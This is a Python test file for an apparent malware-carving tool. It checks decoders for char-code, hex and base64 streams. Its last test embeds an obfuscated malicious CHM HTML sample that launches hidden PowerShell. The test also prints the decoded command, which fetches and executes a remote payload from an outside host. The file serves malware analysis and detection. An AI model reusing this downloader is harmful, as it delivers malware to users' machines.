from malcarve.streams import ascii


def test_charcodes():
    d = ascii.ChrDecoder('charcodes')
    s = list(d.decode(b'>LOAD "*",8,1 any c64 fans?'))
    assert len(s) == 0

    s = list(d.decode(b'123,255,1,23,67,90,0,0,0,0'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'\x7b\xff\x01\x17\x43\x5a\x00\x00\x00\x00'
    assert s['offset'] == 0
    assert s['encoding'] == 'charcodes'

    s = list(d.decode(b'asdasdjlk 123,255,1,23,67,90,0,0,0,0; asd \ndsdasd'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'\x7b\xff\x01\x17\x43\x5a\x00\x00\x00\x00'
    assert s['offset'] == 10

    s = list(d.decode(b'asdasdjlk 123,255,1,23,67,90,0,0,0,0; asd \ndsdasd 123,255,1,23,67,90,0,0,0,1'))
    assert len(s) == 2
    s0 = s[0]
    assert s0['stream'] == b'\x7b\xff\x01\x17\x43\x5a\x00\x00\x00\x00'
    assert s0['offset'] == 10
    s1 = s[1]
    assert s1['stream'] == b'\x7b\xff\x01\x17\x43\x5a\x00\x00\x00\x01'
    assert s1['offset'] == 50
 
    s = list(d.decode(b'asdasdjlk 123.255.1.23.67.90.0.0.0.0; asd \ndsdasd'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'\x7b\xff\x01\x17\x43\x5a\x00\x00\x00\x00'
    assert s['offset'] == 10

    s = list(d.decode(b'asdasdjlk 123, 255, 1, 23, 67, 90, 0, 0, 0, 0; asd \ndsdasd'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'\x7b\xff\x01\x17\x43\x5a\x00\x00\x00\x00'
    assert s['offset'] == 10

    s = list(d.decode(b'asdasdjlk Chr(123), Chr(255), Chr(1), Chr(23), Chr(67), Chr(90), Chr(0), Chr(0), Chr(0), Chr(0); asd \ndsdasd'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'\x7b\xff\x01\x17\x43\x5a\x00\x00\x00\x00'
    assert s['offset'] == 10

    s = list(d.decode(b'asdasdjlk = Chr(123) & Chr(255) & Chr(1) & Chr(23) & Chr(67) & Chr(90) & Chr(0) & Chr(0) & Chr(0) & Chr(0) asd \ndsdasd'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'\x7b\xff\x01\x17\x43\x5a\x00\x00\x00\x00'
    assert s['offset'] == 12

    # cheeky oblique rat docs
    s = list(d.decode(b'asdasdjlk 123O255O1O23O67O90O0O0O0O0 asd \ndsdasd'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'\x7b\xff\x01\x17\x43\x5a\x00\x00\x00\x00'
    assert s['offset'] == 10


def test_hex():
    d = ascii.HexDecoder('base16')
    # TODO: how to distinguish char codes from hex
    #s = list(d.decode(b'123,255,1,23,67,90,0,0,0,0'))
    #assert len(s) == 0

    s = list(d.decode(b'12,25,1f,23,67,90,00,00,00,00'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'\x12\x25\x1f\x23\x67\x90\x00\x00\x00\x00'
    assert s['offset'] == 0
    assert s['encoding'] == 'base16'

    s = list(d.decode(b'ZZ12251f23679000000000ZZ'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'\x12\x25\x1f\x23\x67\x90\x00\x00\x00\x00'
    assert s['offset'] == 2
    assert s['encoding'] == 'base16'

    s = list(d.decode(b'ZZ12251f23679000000000ZZZZ12251f23679000000001ZZ'))
    assert len(s) == 3 # each hex run separate and also a combined output
    s0 = s[0]
    assert s0['stream'] == b'\x12\x25\x1f\x23\x67\x90\x00\x00\x00\x00'
    assert s0['offset'] == 2
    assert s0['encoding'] == 'base16'

    s1 = s[1]
    assert s1['stream'] == b'\x12\x25\x1f\x23\x67\x90\x00\x00\x00\x01'
    assert s1['offset'] == 26
    assert s1['encoding'] == 'base16'

    s2 = s[2]
    assert s2['stream'] == b'\x12\x25\x1f\x23\x67\x90\x00\x00\x00\x00\x12\x25\x1f\x23\x67\x90\x00\x00\x00\x01'
    assert s2['offset'] == 2
    assert s2['encoding'] == 'base16'

    s = list(d.decode(b'12251f23679000000000\r\n12251f23679000000001\r\n'))
    assert len(s) == 1 # whitespace is ignored to produce one run of hex
    s0 = s[0]
    assert s0['stream'] == b'\x12\x25\x1f\x23\x67\x90\x00\x00\x00\x00\x12\x25\x1f\x23\x67\x90\x00\x00\x00\x01'
    assert s0['offset'] == 0
    assert s0['encoding'] == 'base16'

    # don't support mixed case
    s = list(d.decode(b'ABcedf236AA000000000'))
    assert len(s) == 0

def test_base64():
    d = ascii.B64Decoder('base64')
    s = list(d.decode(b'123,255,1,23,67,90,0,0'))
    assert len(s) == 0

    s = list(d.decode(b'QXJlIHlvdSBlbnRlcnRhaW5lZCE/'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'Are you entertained!?'
    assert s['offset'] == 0
    assert s['encoding'] == 'base64'

    s = list(d.decode(b'\x01\x02;;QXJlIHlvdSBlbnRlcnRhaW5lZCE/;;='))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'Are you entertained!?'
    assert s['offset'] == 4
    assert s['encoding'] == 'base64'


def test_joined_hex():
    """From CHM b4d712b67895eed2a5b8e382632ce119dbfea2b199de96fbc84f83dfdc3b09ed, html obfuscation"""
    html = b"""<script language="javascript">


document.write(unescape(dfjhdf() + jyjhj() + ytyujg() + eweeee()));

function dfjhdf()

{

return '%3C%68%74%6D%6C%3E%0A%3C%74%69%74%6C%65%3E%20%43%75%73%74%6F%6D%65%72%20%73%65%72%76%69%63%65%20%3C%2F%74%69%74%6C%65%3E%0A%3C%68%65%61%64%3E%0A%3C%2F%68%65%61%64%3E%0A%3C%62%6F%64%79%3E%0A%0A%3C%68%32%20%61%6C%69%67%6E%3D%63%65%6E%74%65%72%3E%20%43%75%73%74%6F%6D%65%72%20%73%65%72%76%69%63%65%20%3C%2F%68%32%3E%0A%3C%70%3E%0A%3C%68%33%20%61%6C%69%67%6E%3D%63%65%6E%74%65%72%3E%20%50%6C%65%61%73%65%20%57%61%69%74%2E%2E%2E%20%3C%2F%68%33%3E%0A%3C%2F%70%3E%0A%3C%2F%62%6F%64%79%3E%0A%3C%2F%68%74%6D%6C%3E%0A%0A%3C%4F%42%4A%45%43%54%20%69%64%3D%73%68%6F%72%74%63%75%74%20%63%6C%61%73%73%69%64%3D%22%63%6C%73%69%64%3A%35%32%61%32%61%61%61%65%2D%30%38%35%64%2D%34%31%38%37%2D%39%37%65%61%2D%38%63%33%30%64%62%39%39%30%34%33%36%22%20%77%69%64%74%68%3D%31%20%68%65%69%67%68%74%3D%31%3E%0A%0A%0A%3C%50%41%52%41%4D%20%6E%61%6D%65%3D%22%43%6F%6D%6D%61%6E%64%22%20%76%61%6C%75%65%3D%22%53%68%6F%72%74%43%75%74%22%3E%0A%3C%50%41%52%41%4D%20%6E%61%6D%65%3D%22%49%74%65%6D%31%22%20%76%61%6C%75%65%3D%22%2C%43%3A%5C%57%69%6E%64%6F%77%73%5C%53%79%73%74%65%6D%33%32%5C%57%69%6E%64%6F%77%73%50%6F%77%65%72%53%68%65%6C%6C%5C%76%31%2E%30%5C%50%6F%77%65%72%73%68%65%6C%6C%2E%65%78%65%2C%20%2D%57%69%6E%64%6F%77%53%74%79%6C%65%20%48%69%64%64%65%6E%20%24%49%6B%74%56%6D%3D%27%44%34%5E%43%37%5E%37%32%5E%37%32%5E%30%32%5E%45%36%5E%39%36%5E%46%36%5E%41%36%5E%44%32%5E%30%32%5E%33%37%5E%32%37%5E%31%36%5E%38%36%5E%33%34%5E%39%36%5E%39%36%5E%33%36%5E%33%37%5E%31%36%5E%34%32%5E%30%32%5E%44%33%5E%37%36%5E%45%36%5E%39%36%5E%32%37%5E%34%37%5E%33%35%5E%39%36%5E%39%36%5E%33%36%5E%33%37%5E%31%36%5E%34%32%5E%42%33%5E%44%37%5E%32%32%5E%46%35%5E%34%32%5E%38%37%5E%30%33%5E%32%32%5E%44%35%5E%35%36%5E%34%37%5E%39%37%5E%32%36%5E%42%35%5E%44%35%5E%32%37%5E%31%36%5E%38%36%5E%33%36%5E%42%35%5E%42%37%5E%30%32%5E%34%37%5E%33%36%5E%35%36%5E%41%36%5E%32%36%5E%46%34%5E%44%32%5E%38%36%5E%33%36%5E%31%36%5E%35%34%5E%32%37%5E%46%36%5E%36%34%5E%43%37%5E%30%32%5E%39%32%5E%37%32%5E%45%35%5E%37%32%5E%38%32%5E%34%37%5E%39%36%5E%43%36%5E%30%37%5E%33%37%5E%45%32%5E%36%37%5E%44%36%5E%34%32%5E%30%32%5E%44%33%5E%33%37%5E%32%37%5E%31%36%5E%38%36%5E%33%34%5E%39%36%5E%39%36%5E%33%36%5E%33%37%5E%31%36%5E%34%32%5E%42%33%5E%39%32%5E%37%32%5E%37%36%5E%30%37%5E%41%36%5E%45%32%5E%35%33%5E%34%34%5E%46%32%5E%32%37%5E%37%36%5E%45%32%5E%39%37%5E%30%37%5E%31%36%5E%32%37%5E%35%36%5E%38%36%5E%34%37%5E%43%36%5E%31%36%5E%33%36%5E%39%36%5E%33%37%5E%39%37%5E%38%36%5E%30%37%5E%46%32%5E%46%32%5E%41%33%5E';
}

function jyjhj()

{

return '%30%37%5E%34%37%5E%34%37%5E%38%36%5E%37%32%5E%43%32%5E%34%36%5E%46%36%5E%38%36%5E%34%37%5E%35%36%5E%44%34%5E%41%33%5E%41%33%5E%44%35%5E%35%36%5E%30%37%5E%39%37%5E%34%35%5E%43%36%5E%43%36%5E%31%36%5E%33%34%5E%45%32%5E%33%36%5E%39%36%5E%33%37%5E%31%36%5E%32%34%5E%43%36%5E%31%36%5E%35%37%5E%33%37%5E%39%36%5E%36%35%5E%45%32%5E%34%37%5E%36%36%5E%46%36%5E%33%37%5E%46%36%5E%32%37%5E%33%36%5E%39%36%5E%44%34%5E%42%35%5E%43%32%5E%37%32%5E%37%36%5E%45%36%5E%39%36%5E%32%37%5E%34%37%5E%33%35%5E%34%36%5E%31%36%5E%46%36%5E%43%36%5E%45%36%5E%37%37%5E%46%36%5E%34%34%5E%37%32%5E%43%32%5E%39%37%5E%34%37%5E%34%37%5E%34%32%5E%38%32%5E%35%36%5E%44%36%5E%31%36%5E%45%36%5E%39%37%5E%32%34%5E%43%36%5E%43%36%5E%31%36%5E%33%34%5E%41%33%5E%41%33%5E%44%35%5E%45%36%5E%46%36%5E%39%36%5E%34%37%5E%33%36%5E%31%36%5E%32%37%5E%35%36%5E%34%37%5E%45%36%5E%39%34%5E%45%32%5E%33%36%5E%39%36%5E%33%37%5E%31%36%5E%32%34%5E%43%36%5E%31%36%5E%35%37%5E%33%37%5E%39%36%5E%36%35%5E%45%32%5E%34%37%5E%36%36%5E%46%36%5E%33%37%5E%46%36%5E%32%37%5E%33%36%5E%39%36%5E%44%34%5E%42%35%5E%30%32%5E%44%33%5E%36%37%5E%44%36%5E%34%32%5E%42%33%5E%39%32%5E%37%32%5E%33%36%5E%39%36%5E%33%37%5E%31%36%5E%32%34%5E%43%36%5E%31%36%5E%35%37%5E%33%37%5E%39%36%5E%36%35%5E%45%32%5E%34%37%5E%36%36%5E%46%36%5E%33%37%5E%46%36%5E%32%37%5E%33%36%5E%39%36%5E%44%34%5E%37%32%5E%38%32%5E%35%36%5E%44%36%5E%31%36%5E%45%34%5E%43%36%5E%31%36%5E%39%36%5E%34%37%5E%32%37%5E%31%36%5E%30%35%5E%38%36%5E%34%37%5E%39%36%5E%37%35%5E%34%36%5E%31%36%5E%46%36%5E%43%34%5E%41%33%5E%41%33%5E%44%35%5E%39%37%5E%43%36%5E%32%36%5E%44%36%5E%35%36%5E%33%37%5E%33%37%5E%31%34%5E%45%32%5E%45%36%5E%46%36%5E';
}

function ytyujg()

{

return '%39%36%5E%34%37%5E%33%36%5E%35%36%5E%43%36%5E%36%36%5E%35%36%5E%32%35%5E%45%32%5E%44%36%5E%35%36%5E%34%37%5E%33%37%5E%39%37%5E%33%35%5E%42%35%5E%30%32%5E%44%35%5E%34%36%5E%39%36%5E%46%36%5E%36%37%5E%42%35%5E%42%33%5E%44%34%5E%43%37%5E%37%32%5E%39%32%5E%34%37%5E%45%36%5E%35%36%5E%37%32%5E%42%32%5E%37%32%5E%39%36%5E%43%36%5E%33%34%5E%32%36%5E%37%32%5E%42%32%5E%37%32%5E%35%36%5E%37%35%5E%45%32%5E%34%37%5E%37%32%5E%42%32%5E%37%32%5E%35%36%5E%45%34%5E%30%32%5E%34%37%5E%33%36%5E%37%32%5E%42%32%5E%37%32%5E%35%36%5E%41%36%5E%32%36%5E%46%34%5E%37%32%5E%42%32%5E%37%32%5E%44%32%5E%37%37%5E%35%36%5E%45%34%5E%38%32%5E%37%32%5E%44%33%5E%39%37%5E%34%37%5E%34%37%5E%34%32%5E%42%33%5E%32%33%5E%32%33%5E%30%37%5E%34%32%5E%30%32%5E%44%33%5E%30%32%5E%43%36%5E%46%36%5E%33%36%5E%46%36%5E%34%37%5E%46%36%5E%32%37%5E%30%35%5E%39%37%5E%34%37%5E%39%36%5E%32%37%5E%35%37%5E%33%36%5E%35%36%5E%33%35%5E%41%33%5E%41%33%5E%44%35%5E%32%37%5E%35%36%5E%37%36%5E%31%36%5E%45%36%5E%31%36%5E%44%34%5E%34%37%5E%45%36%5E%39%36%5E%46%36%5E%30%35%5E%35%36%5E%33%36%5E%39%36%5E%36%37%5E%32%37%5E%35%36%5E%33%35%5E%45%32%5E%34%37%5E%35%36%5E%45%34%5E%45%32%5E%44%36%5E%35%36%5E%34%37%5E%33%37%5E%39%37%5E%33%35%5E%42%35%5E%42%33%5E%39%32%5E%32%33%5E%37%33%5E%30%33%5E%33%33%5E%30%32%5E%43%32%5E';
}

function eweeee()

{

return '%44%35%5E%35%36%5E%30%37%5E%39%37%5E%34%35%5E%43%36%5E%46%36%5E%33%36%5E%46%36%5E%34%37%5E%46%36%5E%32%37%5E%30%35%5E%39%37%5E%34%37%5E%39%36%5E%32%37%5E%35%37%5E%33%36%5E%35%36%5E%33%35%5E%45%32%5E%34%37%5E%35%36%5E%45%34%5E%45%32%5E%44%36%5E%35%36%5E%34%37%5E%33%37%5E%39%37%5E%33%35%5E%42%35%5E%38%32%5E%34%37%5E%33%36%5E%35%36%5E%41%36%5E%32%36%5E%46%34%5E%46%36%5E%34%35%5E%41%33%5E%41%33%5E%44%35%5E%44%36%5E%35%37%5E%45%36%5E%35%34%5E%42%35%5E%30%32%5E%44%33%5E%30%32%5E%32%33%5E%32%33%5E%30%37%5E%34%32%5E%42%33%5E%39%32%5E%37%36%5E%45%36%5E%39%36%5E%30%37%5E%34%32%5E%38%32%5E%30%32%5E%43%36%5E%39%36%5E%34%37%5E%45%36%5E%35%37%5E%30%32%5E%44%37%5E%34%37%5E%35%36%5E%39%36%5E%35%37%5E%31%35%5E%44%32%5E%30%32%5E%31%33%5E%30%32%5E%34%37%5E%45%36%5E%35%37%5E%46%36%5E%33%36%5E%44%32%5E%30%32%5E%44%36%5E%46%36%5E%33%36%5E%45%32%5E%35%36%5E%43%36%5E%37%36%5E%46%36%5E%46%36%5E%37%36%5E%30%32%5E%30%37%5E%44%36%5E%46%36%5E%33%36%5E%44%32%5E%30%32%5E%45%36%5E%46%36%5E%39%36%5E%34%37%5E%33%36%5E%35%36%5E%45%36%5E%45%36%5E%46%36%5E%33%36%5E%44%32%5E%34%37%5E%33%37%5E%35%36%5E%34%37%5E%30%32%5E%44%33%5E%30%32%5E%37%36%5E%45%36%5E%39%36%5E%30%37%5E%34%32%5E%42%37%5E%30%32%5E%46%36%5E%34%36%5E%42%33%5E%35%36%5E%45%36%5E%46%36%5E%32%36%5E%34%35%5E%34%32%5E%30%32%5E%44%34%5E%30%32%5E%43%36%5E%31%36%5E%33%37%5E%42%33%5E%39%32%5E%37%32%5E%39%34%5E%37%32%5E%43%32%5E%37%32%5E%45%33%5E%37%32%5E%38%32%5E%35%36%5E%33%36%5E%31%36%5E%43%36%5E%30%37%5E%35%36%5E%32%37%5E%45%32%5E%37%32%5E%38%35%5E%35%34%5E%45%33%5E%37%32%5E%44%33%5E%35%36%5E%45%36%5E%46%36%5E%32%36%5E%34%35%5E%34%32%27%3B%24%74%65%78%74%20%3D%24%49%6B%74%56%6D%2E%54%6F%43%68%61%72%41%72%72%61%79%28%29%3B%5B%41%72%72%61%79%5D%3A%3A%52%65%76%65%72%73%65%28%24%74%65%78%74%29%3B%24%74%75%3D%2D%6A%6F%69%6E%20%24%74%65%78%74%3B%24%6A%6D%3D%24%74%75%2E%53%70%6C%69%74%28%27%5E%27%29%20%7C%20%66%6F%72%45%61%63%68%20%7B%5B%63%68%61%72%5D%28%5B%63%6F%6E%76%65%72%74%5D%3A%3A%74%6F%69%6E%74%31%36%28%24%5F%2C%31%36%29%29%7D%3B%24%6A%6D%20%2D%6A%6F%69%6E%20%27%27%7C%20%26%20%28%2D%4A%6F%69%6E%20%28%28%31%31%31%2C%20%31%30%35%2C%20%31%33%30%29%7C%20%46%6F%72%45%61%63%68%2D%4F%62%6A%65%63%74%20%7B%28%20%5B%43%6F%6E%76%65%72%74%5D%3A%3A%54%6F%49%6E%74%31%36%28%28%5B%53%74%72%69%6E%67%5D%24%5F%20%29%2C%20%38%29%20%2D%41%73%5B%43%68%61%72%5D%29%7D%29%29%22%3E%0A%0A%0A%3C%2F%4F%42%4A%45%43%54%3E%0A%0A%3C%53%43%52%49%50%54%3E%0A%73%68%6F%72%74%63%75%74%2E%43%6C%69%63%6B%28%29%3B%0A%3C%2F%53%43%52%49%50%54%3E%0A%0A';
}

</script>"""
    # decode joined, % separted hex, reverse and decode ^ separated hex
    d = ascii.HexDecoder('base16')
    s = list(d.decode(html))
    assert len(s) == 5 # 4 chunks and one combined
    s = s[4]
    assert len(s['stream']) == 2599
    assert s['offset'] == 133
    assert s['encoding'] == 'base16'

    # manually do the reverse for test
    s2 = list(d.decode(s['stream'][::-1]))

    content = [x['stream'] for x in s2]
    assert b"""$Tbone=\'>EX\'.replace(\'>\',\'I\');sal M $Tbone;do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);$p22 = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol = $p22;$tty=\'(New-\'+\'Obje\'+\'ct Ne\'+\'t.We\'+\'bCli\'+\'ent)\'|M;[void] [System.Reflection.Assembly]::LoadWithPartialName(\'Microsoft.VisualBasic\');$mv= [Microsoft.VisualBasic.Interaction]::CallByname($tty,\'DownloadString\',[Microsoft.VisualBasic.CallType]::Method,\'http://physicaltherapy.gr/D5.jpg\');$asciiChars= $mv.split(\'^\') |ForEach-Object {[char][byte]"0x$_"};$asciiString= $asciiChars -join \'\'|M""" in content
